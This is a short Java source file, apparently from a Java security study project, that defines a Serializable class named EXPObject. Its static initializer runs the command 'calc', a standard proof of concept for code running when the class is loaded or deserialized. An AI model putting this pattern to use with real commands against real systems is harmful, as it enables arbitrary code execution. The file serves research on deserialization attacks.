package com.pinger.javasec;

import java.io.IOException;
import java.io.Serializable;

/**
 * @author : p1n93r
 * @date : 2021/7/26 18:31
 */
public class EXPObject implements Serializable {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
